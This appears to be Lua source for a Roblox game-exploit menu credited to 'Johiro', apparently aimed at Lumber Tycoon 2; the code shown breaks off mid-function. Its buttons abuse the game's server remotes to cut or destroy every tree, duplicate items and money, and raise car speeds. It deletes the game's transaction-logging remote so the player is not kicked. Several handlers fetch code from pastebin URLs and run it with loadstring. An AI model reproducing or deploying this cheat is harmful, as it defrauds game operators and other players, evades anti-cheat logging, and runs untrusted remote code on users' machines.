+--Credits to Johiro, if you decide to skid atleast give credits
+end)
+Goldaxe.MouseButton1Down:connect(function()
+  makesound("rbxassetid://156785206")
+    if GAxe == true then
+        GAxe = false
+  Goldaxe.Text = "Gold Axe Off"
+Goldaxe.TextColor3 = Color3.new(255, 0, 0)
+    elseif GAxe == false then
+        GAxe = true
+  Goldaxe.Text = "Gold Axe On"
+Goldaxe.TextColor3 = Color3.new(0, 1, 0)
+--Credits to Johiro
+    end
+end)
+
+
+InfoText24.Name = "InfoText2"
+InfoText24.Parent = MainFrame
+InfoText24.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText24.BorderColor3 = Color3.new(1, 0, 0)
+InfoText24.BackgroundTransparency = 0
+InfoText24.Position = UDim2.new(0, 28, 0, 330)
+InfoText24.Size = UDim2.new(0, 150, 0, 150)
+InfoText24.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText24.Font = Enum.Font.Fantasy
+InfoText24.Text =  "Johiro Treeaura\n\n1.Select any axe.\n2.Just walk around.\n\n\nThis Tool will cut all the trees in a big area."
+InfoText24.TextSize = 14
+InfoText24.TextWrapped = true
+InfoText24.Visible = false
+
+Treeaura.MouseEnter:connect(function()
+InfoText24.Visible = true
+end)
+
+Treeaura.MouseLeave:connect(function()
+InfoText24.Visible = false
+end)
+
+Treeaura.Name = "Tree aura"
+Treeaura.Parent = WoodFrame
+Treeaura.BackgroundColor3 = Color3.new(0, 0, 0)
+Treeaura.BackgroundTransparency = 0.59999998807907
+Treeaura.BorderColor3 = Color3.new(1, 0, 0)
+Treeaura.Position = UDim2.new(0, 3, 0, 213)
+Treeaura.Size = UDim2.new(0, 165, 0, 20)
+Treeaura.Font = Enum.Font.Fantasy
+Treeaura.Text = "Tree Aura"
+Treeaura.TextColor3 = Color3.new(1, 1, 1)
+Treeaura.TextSize = 14
+Treeaura.MouseButton1Down:connect(function()
+  makesound("rbxassetid://156785206")
+    if CutEnabled == true then
+        CutEnabled = false
+        Treeaura.Text = "Tree Aura off"
+Treeaura.TextColor3 = Color3.new(255, 0, 0)
+    elseif CutEnabled == false then
+        CutEnabled = true
+        Treeaura.Text = "Tree Aura on"
+Treeaura.TextColor3 = Color3.new(0, 1, 0)
+    end
+end)
+--Credits to Johiro
+
+local function GetAxe() --Gets your current axe thats equiped when called
+    if game.Players.LocalPlayer.Character:FindFirstChild("Tool") then 
+        return game.Players.LocalPlayer.Character.Tool --returns the axe when found
+    else 
+        return false --returns false when not equiped
+    end
+end
+
+local function GetDamage(Axe, TreeClass)-- Gets the right Damage of the axe and returns it if called to prevent killing yourself like gold axe
+    if Axe.ToolTip == "Basic Hatchet" then return 0.2
+    elseif Axe.ToolTip == "Plain Axe" then return 0.55
+    elseif Axe.ToolTip == "Steel Axe" then return 0.93
+    elseif Axe.ToolTip == "Hardened Axe" then return 1.45
+    elseif Axe.ToolTip == "Silver Axe" then return 1.6
+    elseif Axe.ToolTip == "Rukiryaxe" then return 1.68
+    elseif Axe.ToolTip == "Beta Axe of Bosses" then return 1.45
+    elseif Axe.ToolTip == "Alpha Axe of Testing" then return 1.5
+    elseif Axe.ToolTip == "Fire Axe" then 
+        if TreeClass ~= "Volcano" then return 0.6 else return 6.35 end
+    elseif Axe.ToolTip == "End Times Axe" then 
+        if TreeClass ~= "LoneCave" then return 1.58 else return 10000000 end
+    elseif Axe.ToolTip == "Candy Cane Axe" then return 0
+	elseif Axe.ToolTip == "Johiro" then return 1.8
+    elseif Axe.ToolTip == "Beesaxe" then return 1.4
+    elseif Axe.ToolTip == "CHICKEN AXE" then return 0.9
+    elseif Axe.ToolTip == "Amber Axe" then return 3.39
+    elseif Axe.ToolTip == "The Many Axe" then return 10.2
+    elseif Axe.ToolTip == "Gingerbread Axe" then 
+        if TreeClass == "Walnut" then return 8.5 
+    elseif TreeClass == "Koa" then return 11 else return 1.2 end
+    elseif Axe.ToolTip == "Bird Axe" then 
+        if TreeClass == "Volcano" then return 2.5 elseif TreeClass == "CaveCrawler" then return 3.9 else return 1.65 end
+    end
+end
+    
+TreeList = {} --Creates a table of the trees
+for a,b in pairs(workspace:GetChildren()) do
+    if b.name == "TreeRegion" then 
+        b.ChildAdded:Connect(function(NewTree)--Creates functions that Adds new trees to the list
+            table.insert(TreeList, NewTree)
+        end)
+        for c,d in pairs(b:GetChildren()) do-- Adds the trees when first time starting the script 
+            if d.Name == "Model" then
+                table.insert(TreeList, d)
+            end
+        end
+    end
+end
+
+local function CutTree(Tree) --Cuts the tree when called with the tree you want to cut
+    if GetAxe() ~= false then --checks if you have a axe equiped
+		Damage = GetDamage(GetAxe(), Tree.TreeClass.Value) --gets the Damage
+        local CutArguments = {
+            sectionId = 1,
+            faceVector = Vector3.new(0,0,-1),
+            height = 0.5,
+            hitPoints = Damage,
+            cooldown = 0,
+            cuttingClass = "Axe",
+            tool = GetAxe()
+        }
+        for i=1, 50 do
+            game.ReplicatedStorage.Interaction.RemoteProxy:FireServer(Tree.CutEvent, CutArguments)
+        end
+    end
+end
+
+spawn(function() --used spawn so it wont interrupt any of the other things
+CutEnabled = false
+while wait(.5) do --Main loop to do the stuff
+    if CutEnabled == true then
+        if GetAxe() ~= false then --Checks if you have a axe equiped
+            for a,b in pairs(TreeList) do
+                if not b:FindFirstChild("RootCut") and b:FindFirstChild("CutEvent") then --Checks if the tree is already cut
+                    distance = (game.Players.LocalPlayer.Character.Head.Position - b.WoodSection.Position).magnitude --gets the distance between player and tree
+                    if distance < 225 then --if distance lower than 225 then it will cut the tree
+                        CutTree(b) --Calls the function with the tree to cut
+                    end
+                else 
+                    table.remove(TreeList, a)--if tree already cut then it gets removed from the list
+				end
+			end
+        end
+    end
+end 
+end)
+
+InfoText23.Name = "InfoText2"
+InfoText23.Parent = MainFrame
+InfoText23.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText23.BorderColor3 = Color3.new(1, 0, 0)
+InfoText23.BackgroundTransparency = 0
+InfoText23.Position = UDim2.new(0, 28, 0, 330)
+InfoText23.Size = UDim2.new(0, 150, 0, 150)
+InfoText23.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText23.Font = Enum.Font.Fantasy
+InfoText23.Text =  "Harddrag\n\n1.Point at a Plank or Tree.\n2.CLICK LEFT mouse button.\n\n\nThis Tool will help you move heavy loads."
+InfoText23.TextSize = 14
+InfoText23.TextWrapped = true
+InfoText23.Visible = false
+
+Harddrag.MouseEnter:connect(function()
+InfoText23.Visible = true
+end)
+
+Harddrag.MouseLeave:connect(function()
+InfoText23.Visible = false
+end)
+
+Harddrag.Name = "Harddrag"
+Harddrag.Parent = WoodFrame
+Harddrag.BackgroundColor3 = Color3.new(0, 0, 0)
+Harddrag.BackgroundTransparency = 0.59999998807907
+Harddrag.BorderColor3 = Color3.new(1, 0, 0)
+Harddrag.Position = UDim2.new(0, 3, 0, 236)
+Harddrag.Size = UDim2.new(0, 165, 0, 20)
+Harddrag.Font = Enum.Font.Fantasy
+Harddrag.Text = "Hard Drag"
+Harddrag.TextColor3 = Color3.new(1, 1, 1)
+Harddrag.TextSize = 14
+Harddrag.MouseButton1Down:connect(function()
+	  makesound("rbxassetid://156785206")
+Harddrag.Text = "HARD DRAG ACTIVE"
+Harddrag.TextColor3 = Color3.new(0, 1, 0)
+loadstring(game:HttpGet(('https://pastebin.com/raw/uMv85wZZ'),true))()
+
+end)
+
+RemoveT.Name = "RemoveT"
+RemoveT.Parent = WoodFrame
+RemoveT.BackgroundColor3 = Color3.new(0, 0, 0)
+RemoveT.BackgroundTransparency = 0.59999998807907
+RemoveT.BorderColor3 = Color3.new(1, 0, 0)
+RemoveT.Position =  UDim2.new(0, 3, 0, 259)
+RemoveT.Size = UDim2.new(0, 165, 0, 20)
+RemoveT.Font = Enum.Font.Fantasy
+RemoveT.Text = "Remove Trees"
+RemoveT.TextColor3 = Color3.new(1, 1, 1)
+RemoveT.TextSize = 14
+RemoveT.MouseButton1Down:connect(function() 
+  makesound("rbxassetid://156785206")
+	RemoveT.BackgroundColor3 = Color3.new(0, 0, 0)
+                     RemoveT.TextColor3 = Color3.new(0, 1, 0)
+for i,v in pairs(game.Workspace:GetDescendants()) do
+    if v.Name == "WoodSection" and v.Parent:FindFirstChild("CutEvent") then
+        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(v.Parent)
+        game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(v.Parent)
+    end
+end
+game.Workspace.DescendantAdded:connect(function(Thing)
+    wait(0.1)
+    if Thing.Name == "WoodSection" and Thing.Parent:FindFirstChild("CutEvent") then
+        game.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Thing.Parent)
+        game.ReplicatedStorage.Interaction.DestroyStructure:FireServer(Thing.Parent)
+    end
+end)
+end)
+
+
+Copymenu.Name = "Copymenu"
+Copymenu.Parent = Picker
+Copymenu.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
+Copymenu.BorderColor3 = Color3.new(0, 0, 0)
+Copymenu.Position = UDim2.new(0, 15, 0, 260)
+Copymenu.Size = UDim2.new(0, 80, 0, 80)
+Copymenu.ZIndex = 3
+Copymenu.Image = "rbxassetid://4892950027"
+Copymenu.ScaleType = Enum.ScaleType.Crop
+Copymenu.MouseButton1Click:Connect(function()
+CurrentItem.Image = "rbxassetid://4892950027"
+  makesound("rbxassetid://156785206")
+AIntroImage.Visible = false
+AIntroImage1.Visible = false
+AIntroImage2.Visible = false
+AIntroImage3.Visible = false
+TimesFrame.Visible = false
+end)
+
+CopyFrame.Name = "CopyFrame"
+CopyFrame.Parent = MenuFrame
+CopyFrame.BorderSizePixel = 0.5
+CopyFrame.BackgroundTransparency = 0.5
+CopyFrame.BorderColor3 = Color3.new(0, 0, 0)
+CopyFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+CopyFrame.Size = UDim2.new(0, 170, 0, 320)
+CopyFrame.Visible = false
+
+MakeBase.Name = "MakeBase"
+MakeBase.Parent = CopyFrame
+MakeBase.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+MakeBase.Position = UDim2.new(0, 180, 0, 1)
+MakeBase.BackgroundTransparency = 0.5
+MakeBase.BorderColor3 = Color3.new(0, 0, 0)
+MakeBase.Size = UDim2.new(0, 180, 0, 320)
+MakeBase.CanvasPosition = Vector2.new(0,0)
+MakeBase.CanvasSize = UDim2.new(0, 0, 0, 542)
+MakeBase.Visible = true
+
+InfoText2.Name = "InfoText2"
+InfoText2.Parent = MainFrame
+InfoText2.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText2.BorderColor3 = Color3.new(0, 0, 0)
+InfoText2.BackgroundTransparency = 0
+InfoText2.Position = UDim2.new(0, 20, 0, 353)
+InfoText2.Size = UDim2.new(0, 140, 0, 140)
+InfoText2.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText2.Font = Enum.Font.Fantasy
+InfoText2.Text = "Base Dupes\n\n1.Click on Players Name.\n2.Click on Base Type.\n3 Make Sure you have MaxLand.\n3 It will DUBE BASE to other players."
+InfoText2.TextSize = 14
+InfoText2.TextWrapped = true
+InfoText2.Visible = false
+
+BaseTitle.MouseEnter:connect(function()
+InfoText2.Visible = true
+end)
+
+BaseTitle.MouseLeave:connect(function()
+InfoText2.Visible = false
+end)
+
+BaseTitle.Name = "BaseTitle"
+BaseTitle.Parent = MakeBase
+BaseTitle.BackgroundColor3 = Color3.new(255, 0, 0)
+BaseTitle.BackgroundTransparency = 0
+BaseTitle.BorderColor3 = Color3.fromRGB(1, 0, 0)
+BaseTitle.Position = UDim2.new(0, 5, 0, 3)
+BaseTitle.Size = UDim2.new(0, 148, 0, 20)
+BaseTitle.Font = Enum.Font.Fantasy
+BaseTitle.Text = "Base Dupes"
+BaseTitle.TextColor3 = Color3.new(1, 1, 1)
+BaseTitle.TextSize = 14
+
+loadstring(game:HttpGet('https://pastebin.com/raw/KX5VcLs3',true))()
+
+
+InfoText4.Name = "InfoText2"
+InfoText4.Parent = MainFrame
+InfoText4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText4.BorderColor3 = Color3.new(0, 0, 0)
+InfoText4.BackgroundTransparency = 0
+InfoText4.Position = UDim2.new(0, 20, 0, 353)
+InfoText4.Size = UDim2.new(0, 140, 0, 140)
+InfoText4.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText4.Font = Enum.Font.Fantasy
+InfoText4.Text = "Copy Base\n\n1.Click on Players Name.\n2.Click on Copy Base.\n3 Make Sure you have MaxLand."
+InfoText4.TextSize = 14
+InfoText4.TextWrapped = true
+InfoText4.Visible = false
+
+CopyBase.MouseEnter:connect(function()
+InfoText4.Visible = true
+end)
+
+CopyBase.MouseLeave:connect(function()
+InfoText4.Visible = false
+end)
+
+CopyBase.Name = "CopyBase"
+CopyBase.Parent = CopyFrame
+CopyBase.BackgroundColor3 = Color3.new(0, 0, 0)
+CopyBase.BackgroundTransparency = 0.6
+CopyBase.BorderColor3 = Color3.new(1, 0, 0)
+CopyBase.Position = UDim2.new(0, 5, 0, 189)
+CopyBase.Size = UDim2.new(0, 160, 0, 20)
+CopyBase.Font = Enum.Font.Fantasy
+CopyBase.Text = "Copy Base"
+CopyBase.TextColor3 = Color3.new(0, 1, 0)
+CopyBase.TextSize = 14
+CopyBase.MouseButton1Down:connect(function()
+  makesound("rbxassetid://156785206")
+loadstring(game:HttpGet('https://pastebin.com/raw/p9mWDwFv',true))()
+end)
+
+DupeTitle.Name = "dupeTitle"
+DupeTitle.Parent = CopyFrame
+DupeTitle.BackgroundColor3 = Color3.new(1, 0, 0)
+DupeTitle.BackgroundTransparency = 0.10000000149012
+DupeTitle.BorderSizePixel = 0
+DupeTitle.Position = UDim2.new(0, 5, 0, 215)
+DupeTitle.Size = UDim2.new(0, 160, 0, 20)
+DupeTitle.Font = Enum.Font.Fantasy
+DupeTitle.Text = "Dupe Tools"
+DupeTitle.TextColor3 = Color3.new(1, 1, 1)
+DupeTitle.TextSize = 14
+
+InfoText5.Name = "InfoText2"
+InfoText5.Parent = MainFrame
+InfoText5.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText5.BorderColor3 = Color3.new(1, 0, 0)
+InfoText5.BackgroundTransparency = 0
+InfoText5.Position = UDim2.new(0, 20, 0, 353)
+InfoText5.Size = UDim2.new(0, 140, 0, 140)
+InfoText5.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText5.Font = Enum.Font.Fantasy
+InfoText5.Text =  "JOHIRO Dupe Mode\n\n1.Press Dupe Mode.\n2.Copy items to another player \n3.Other player reloads.\n4.You reload."
+InfoText5.TextSize = 14
+InfoText5.TextWrapped = true
+InfoText5.Visible = false
+
+ItemDupe.MouseEnter:connect(function()
+InfoText5.Visible = true
+end)
+
+ItemDupe.MouseLeave:connect(function()
+InfoText5.Visible = false
+end)
+
+ItemDupe.Name = "ItemDupe"
+ItemDupe.Parent = CopyFrame
+ItemDupe.BackgroundColor3 = Color3.new(0, 0, 0)
+ItemDupe.BackgroundTransparency = 0.6
+ItemDupe.BorderColor3 = Color3.new(1, 0, 0)
+ItemDupe.Position = UDim2.new(0, 5, 0, 240)
+ItemDupe.Size = UDim2.new(0, 160, 0, 20)
+ItemDupe.Font = Enum.Font.Fantasy
+ItemDupe.Text = "Dupe Items"
+ItemDupe.TextColor3 = Color3.new(1, 1, 1)
+ItemDupe.TextSize = 14
+ItemDupe.MouseButton1Down:connect(function()
+  makesound("rbxassetid://156785206")
+--Functions, look here for the source and how it works if you want to know, also give me credits if you skid xD
+
+--Prevent the game to kick you by letting the script error by not fincing the remote
+if game.ReplicatedStorage.Transactions:FindFirstChild("AddLog") then 
+	game.ReplicatedStorage.Transactions.AddLog:Destroy()
+end
+
+--Button function (toggle)
+local Enabled = false
+ItemDupe.MouseButton1Down:Connect(function()
+	if Enabled == true then
+		Enabled = false
+		ItemDupe.Text = "Dupe Mode: Disabled"
+	elseif Enabled == false then
+		Enabled = true
+		ItemDupe.Text = "Dupe Mode: Enabled"
+	end
+end)
+
+
+--Changes slot to -1 when Enabled to prevent saving
+while wait(.25) do
+	if Enabled == true then
+		game.Players.LocalPlayer.CurrentSaveSlot.Value = -1
+	end
+end
+
+--Credits to Johiro
+end)
+
+Slot.Name = "Slot"
+Slot.Parent = CopyFrame
+Slot.BackgroundColor3 = Color3.new(0, 0, 0)
+Slot.BackgroundTransparency = 0.6
+Slot.BorderColor3 = Color3.new(1, 0, 0)
+Slot.Position = UDim2.new(0, 5, 0, 271)
+Slot.Size = UDim2.new(0, 160, 0, 20)
+Slot.Font = Enum.Font.Fantasy
+Slot.Text = "Base Slot Number "
+Slot.TextColor3 = Color3.new(0, 1, 0)
+Slot.TextSize = 14
+
+--Locals
+local MoneyCooldown = false
+local CurrentSlot = game.Players.LocalPlayer:WaitForChild("CurrentSaveSlot").Value
+local ScriptLoad = false
+local CurrentlySavingOrLoading = game.Players.LocalPlayer:WaitForChild("CurrentlySavingOrLoading")
+
+--Functions
+local function CheckIfSlotAvailable(Slot)
+	for a,b in pairs(game.ReplicatedStorage.LoadSaveRequests.GetMetaData:InvokeServer(game.Players.LocalPlayer)) do 
+		if a == Slot then 
+			for c,d in pairs(b) do 
+				if c == "NumSaves" and d ~= 0 then 
+					return true
+				else
+					return false
+				end
+			end
+		end
+	end
+end
+
+local function CheckSlotNumber() --Checks if the slot number is right
+    if Slot.Text == "1" or Slot.Text == "2" or Slot.Text == "3" or Slot.Text == "4" or Slot.Text == "5" or Slot.Text == "6" then
+		local SlotNumber = tonumber(Slot.Text)
+		return SlotNumber
+		else return false
+	end
+end
+
+local function SendNotification(Title,Text,Duration) -- Sends Notification in the bottom right of the screen
+	game.StarterGui:SetCore("SendNotification", {
+		Title = Title;
+		Text = Text;
+		Icon = nil;
+		Duration = Duration
+	})
+end
+
+DMoney.Name = "DMoney"
+DMoney.Parent = CopyFrame
+DMoney.BackgroundColor3 = Color3.new(0, 0, 0)
+DMoney.BackgroundTransparency = 0.6
+DMoney.BorderColor3 = Color3.new(1, 0, 0)
+DMoney.Position = UDim2.new(0, 5, 0, 294)
+DMoney.Size = UDim2.new(0, 88, 0, 20)
+DMoney.Font = Enum.Font.Fantasy
+DMoney.Text = "Dupe Money"
+DMoney.TextColor3 = Color3.new(1, 1, 1)
+DMoney.TextSize = 14
+DMoney.MouseButton1Down:connect(function() --Sends the money and will come back after around 2 mins
+  makesound("rbxassetid://156785206")
+	if MoneyCooldown == true then
+		SendNotification("Cooldown Notification", "Wait for your Money to come back",2)
+		return
+	elseif MoneyCooldown == false then
+		MoneyCooldown = true
+		SendNotification("Money Sent", "Wait about 2 minutes for your Money to come back", 5)
+		game.ReplicatedStorage.Transactions.ClientToServer.Donate:InvokeServer(game.Players.LocalPlayer, game.Players.LocalPlayer.leaderstats.Money.Value, 1)
+		SendNotification("Money Received", "You received your money that you have sent earlier", 5)
+		MoneyCooldown = false
+	end
+end)
+
+InfoText3.Name = "InfoText2"
+InfoText3.Parent = MainFrame
+InfoText3.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText3.BorderColor3 = Color3.new(1, 0, 0)
+InfoText3.BackgroundTransparency = 0
+InfoText3.Position = UDim2.new(0, 20, 0, 353)
+InfoText3.Size = UDim2.new(0, 140, 0, 140)
+InfoText3.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText3.Font = Enum.Font.Fantasy
+InfoText3.Text = "JOHIRO Dupe Money\n\n1.Enter Your loaded Slot Number (IN Base Slot Number).\n2.Press Dupe Money.\n3.Press Load Slot.\n4.Wait about two mins."
+InfoText3.TextSize = 14
+InfoText3.TextWrapped = true
+InfoText3.Visible = false
+
+DMoney.MouseEnter:connect(function()
+InfoText3.Visible = true
+end)
+
+DMoney.MouseLeave:connect(function()
+InfoText3.Visible = false
+end)
+
+
+Load.Name = "Load"
+Load.Parent = CopyFrame
+Load.BackgroundColor3 = Color3.new(0, 0, 0)
+Load.BackgroundTransparency = 0.6
+Load.BorderColor3 = Color3.new(1, 0, 0)
+Load.Position = UDim2.new(0, 97, 0, 294)
+Load.Size = UDim2.new(0, 68, 0, 20)
+Load.Font = Enum.Font.Fantasy
+Load.Text = "Load Slot"
+Load.TextColor3 = Color3.new(0, 1, 0)
+Load.TextSize = 14
+Load.MouseButton1Down:connect(function() --Loads the slot you want
+  makesound("rbxassetid://156785206")
+	ScriptLoad = true
+	local CheckSlot = CheckSlotNumber()
+	if CheckSlot ~= false then
+		if CheckIfSlotAvailable(CheckSlot) == true then
+			local LoadSlot = game.ReplicatedStorage.LoadSaveRequests.RequestLoad:InvokeServer(CheckSlot)
+			if LoadSlot == false then
+				SendNotification("Cooldown Notification", "You aren't abled to load now", 1)
+			end
+			if LoadSlot == true then 
+				SendNotification("Reload Notification", "Loaded Your Slot", 2)
+				CurrentSlot = CheckSlot
+			end
+		else
+			SendNotification("Slot not Available", "This Slot is not Available, please choose another slot", 2)
+		end
+	else
+		SendNotification("Incorrect Slot", "Enter a Valid number in the upper field", 1)
+	end
+	ScriptLoad = false
+end)
+
+Artmenu.Name = "Artmenu"
+Artmenu.Parent = Picker
+Artmenu.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
+Artmenu.BorderColor3 = Color3.new(0, 0, 0)
+Artmenu.Position = UDim2.new(0, 15, 0, 345)
+Artmenu.Size = UDim2.new(0, 80, 0, 80)
+Artmenu.ZIndex = 3
+Artmenu.Image = "rbxassetid://4892949606"
+Artmenu.ScaleType = Enum.ScaleType.Crop
+Artmenu.MouseButton1Click:Connect(function()
+CurrentItem.Image = "rbxassetid://4892949606"
+  makesound("rbxassetid://156785206")
+AIntroImage.Visible = false
+AIntroImage1.Visible = false
+AIntroImage2.Visible = false
+AIntroImage3.Visible = false
+TimesFrame.Visible = false
+
+end)
+
+
+ArtFrame.Name = "ArtFrame"
+ArtFrame.Parent = MenuFrame
+ArtFrame.BorderSizePixel = 1
+ArtFrame.BackgroundTransparency = 0.6
+ArtFrame.BorderColor3 = Color3.new(0, 0, 0)
+ArtFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+ArtFrame.Size = UDim2.new(0, 380, 0, 465)
+ArtFrame.Visible = false
+
+loadstring(game:HttpGet('https://pastebin.com/raw/P1Y8eyM0',true))()
+
+loadstring(game:HttpGet('https://pastebin.com/raw/az5498zE',true))()
+
+loadstring(game:HttpGet('https://pastebin.com/raw/XDnBtE7X',true))()
+
+toolamenu.Name = "toolamenu"
+toolamenu.Parent = Picker
+toolamenu.BackgroundColor3 = Color3.fromRGB(196, 40, 28)
+toolamenu.BorderColor3 = Color3.new(0, 0, 0)
+toolamenu.Position = UDim2.new(0, 15, 0,430)
+toolamenu.Size = UDim2.new(0, 80, 0, 80)
+toolamenu.ZIndex = 3
+toolamenu.Image = "rbxassetid://4905880190"
+toolamenu.ScaleType = Enum.ScaleType.Crop
+toolamenu.MouseButton1Click:Connect(function()
+CurrentItem.Image = "rbxassetid://4905880190"
+  makesound("rbxassetid://156785206")
+AIntroImage.Visible = false
+AIntroImage1.Visible = false
+TimesFrame.Visible = true
+
+end)
+
+toolaFrame.Name = "toolaFrame"
+toolaFrame.Parent = MenuFrame
+toolaFrame.BorderSizePixel = 1
+toolaFrame.BackgroundTransparency = 0.5
+toolaFrame.BorderColor3 = Color3.new(0, 0, 0)
+toolaFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+toolaFrame.Size = UDim2.new(0, 170, 0, 442)
+toolaFrame.Visible = false
+
+CarToolsa.Name = "CarToolsa"
+CarToolsa.Parent = toolaFrame
+CarToolsa.BackgroundColor3 = Color3.new(255, 0, 0)
+CarToolsa.BackgroundTransparency = 0
+CarToolsa.BorderColor3 = Color3.fromRGB(151, 0, 0)
+CarToolsa.Position = UDim2.new(0, 2, 0, 3)
+CarToolsa.Size = UDim2.new(0, 166, 0, 20)
+CarToolsa.Font = Enum.Font.Fantasy
+CarToolsa.Text = "--Car Tools--"
+CarToolsa.TextColor3 = Color3.new(1, 1, 1)
+CarToolsa.TextSize = 14
+
+InfoText32.Name = "InfoText2"
+InfoText32.Parent = MainFrame
+InfoText32.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText32.BorderColor3 = Color3.new(0, 0, 0)
+InfoText32.BackgroundTransparency = 0
+InfoText32.Position = UDim2.new(0, 182, 0, 260)
+InfoText32.Size = UDim2.new(0, 150, 0, 150)
+InfoText32.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText32.Font = Enum.Font.Fantasy
+InfoText32.Text =  "Fast Car\n\n1.Click Fast Car.\n2.Enter the speed you want to go (1 -5).\n3.Respawn car."
+InfoText32.TextSize = 14
+InfoText32.TextWrapped = true
+InfoText32.Visible = false
+
+
+CARA.MouseEnter:connect(function()
+InfoText32.Visible = true
+end)
+
+CARA.MouseLeave:connect(function()
+InfoText32.Visible = false
+end)
+
+CARAs.Name = "CARAs"
+CARAs.Parent = toolaFrame
+CARAs.BackgroundColor3 = Color3.new(0, 0, 0)
+CARAs.BorderColor3 = Color3.new(1, 0, 0)
+CARAs.BackgroundTransparency = 0.6
+CARAs.Position = UDim2.new(0, 147, 0, 26)
+CARAs.Size = UDim2.new(0, 21, 0, 20)
+CARAs.Font = Enum.Font.Fantasy
+CARAs.Text = "1"
+CARAs.TextColor3 = Color3.new(1, 1, 1)
+CARAs.TextSize = 14
+
+CARA.Name = "CARA"
+CARA.Parent = toolaFrame
+CARA.BackgroundColor3 = Color3.new(0, 0, 0)
+CARA.BorderColor3 = Color3.new(1, 0, 0)
+CARA.BackgroundTransparency = 0.6
+CARA.Position =  UDim2.new(0, 3, 0, 26)
+CARA.Size = UDim2.new(0, 140, 0, 20)
+CARA.Font = Enum.Font.Fantasy
+CARA.Text = "Fast Car"
+CARA.TextColor3 = Color3.new(1, 1, 1)
+CARA.TextSize = 14
+CARA.MouseButton1Down:connect(function()
+  makesound("rbxassetid://156785206")
+CARA.BackgroundColor3 = Color3.new(0, 0, 0)
+CARA.TextColor3 = Color3.new(0, 1, 0)
+	game.Workspace.PlayerModels.ChildAdded:connect(function(ADDED)
+ wait(0.5)
+if ADDED:FindFirstChild('Configuration') then
+ if ADDED.Configuration:FindFirstChild('MaxSpeed') then
+  ADDED.Configuration.MaxSpeed.Value = CARAs.Text 
+ end
+ end
+end)
+end)
+
+InfoText33.Name = "InfoText2"
+InfoText33.Parent = MainFrame
+InfoText33.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+InfoText33.BorderColor3 = Color3.new(0, 0, 0)
+InfoText33.BackgroundTransparency = 0
+InfoText33.Position = UDim2.new(0, 182, 0, 260)
+InfoText33.Size = UDim2.new(0, 150, 0, 150)
+InfoText33.TextColor3 = Color3.fromRGB(245, 205, 48)
+InfoText33.Font = Enum.Font.Fantasy
+InfoText33.Text =  "Johiro Pink Car Spawner\n\n1.Click Pink Car Spawner.\n2.Place mouse over Spawn Button on car pad .\n3.Press C on your keyboard."
+InfoText33.TextSize = 14
+InfoText33.TextWrapped = true
+InfoText33.Visible = false
+
+PinkCar.MouseEnter:connect(function()
+InfoText33.Visible = true
+end)
+
+PinkCar.MouseLeave:connect(function()
+InfoText33.Visible = false
+end)
+
+PinkCar.Name = "PinkCar"
+PinkCar.Parent = toolaFrame
+PinkCar.BackgroundColor3 = Color3.new(0, 0, 0)
+PinkCar.BorderColor3 = Color3.new(1, 0, 0)
+PinkCar.BackgroundTransparency = 0.6
+PinkCar.Position =  UDim2.new(0, 3, 0, 49)
+PinkCar.Size = UDim2.new(0, 140, 0, 20)
+PinkCar.Font = Enum.Font.Fantasy
+PinkCar.Text = "Pink Car Spawner"
+PinkCar.TextColor3 = Color3.new(1, 1, 1)
+PinkCar.TextSize = 14
+
+PinkCars.Name = "PinkCars"
+PinkCars.Parent = toolaFrame
+PinkCars.BackgroundColor3 = Color3.new(0, 0, 0)
+PinkCars.BorderColor3 = Color3.new(1, 0, 0)
+PinkCars.BackgroundTransparency = 0.6
+PinkCars.Position = UDim2.new(0, 147, 0, 49)
+PinkCars.Size = UDim2.new(0, 21, 0, 20)
+PinkCars.Font = Enum.Font.Fantasy
+PinkCars.Text = "C"
+PinkCars.TextColor3 = Color3.new(1, 1, 1)
+PinkCars.TextSize = 14
+
+PinkCar.MouseButton1Click:connect(function()
+	                     PinkCars.TextColor3 = Color3.new(0, 1, 0)
+                     PinkCar.TextColor3 = Color3.new(0, 1, 0)
+	if _G.Executed == false or _G.Executed == nil then
+_G.Executed = true
+Spawned = false
+Spawning = false
+SpawnPad = nil
+workspace.PlayerModels.ChildAdded:connect(function(Added)
+    if Spawned == false and Spawning == false then 
+		Owner = nil
+		CheckTries = 0
+		CheckSuccess = false
+		repeat
+		wait() 
+		CheckTries = CheckTries + 1
+		if Added:FindFirstChild("Owner") and Added:FindFirstChild("Type") and Added.Type.Value == "Vehicle" and Added:FindFirstChild("Settings") and Added.Settings:FindFirstChild("Color") then 
+			CheckSuccess = true
+			Owner = Added.Owner.Value
+		end
+		until CheckTries == 75 or CheckSuccess == true
+		if Owner == game.Players.LocalPlayer or game.ReplicatedStorage.Interaction.ClientIsWhitelisted:InvokeServer(Owner) == true then
+			Spawning = true
+            Added:WaitForChild("Settings")
+            Added.Settings:WaitForChild("Color")
+            if tostring(Added.Settings.Color.Value) == tostring(1032) then
+				Spawned = true
+            	Spawning = false
+            	print(Spawned)
+            elseif tostring(Added.Settings.Color.Value) ~= tostring(1032) then
+				if SpawnPad:FindFirstChild("ButtonRemote_SpawnButton") and SpawnPad:FindFirstChild("Owner") then 
+					if SpawnPad.Owner.Value == game.Players.LocalPlayer or game.ReplicatedStorage.Interaction.ClientIsWhitelisted:InvokeServer(SpawnPad.Owner.Value) == true then 
+						Spawning = false
